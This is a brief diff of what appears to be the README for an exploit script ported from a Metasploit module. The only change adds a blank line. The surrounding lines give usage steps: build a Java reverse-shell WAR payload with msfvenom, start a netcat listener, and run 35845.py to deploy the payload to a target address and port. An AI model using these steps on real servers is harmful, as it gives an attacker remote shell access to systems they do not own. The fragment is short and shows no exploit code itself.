@@ -21,6 +21,7 @@ Original metasploit module: url
 msfvenom -p java/shell_reverse_tcp LHOST=<ip address> LPORT=4444 -f war > shell.war
 ```
 2. Start netcat listener 
+
 3.run the script
 ```
 35845.py shell.war 192.168.1.1 8080
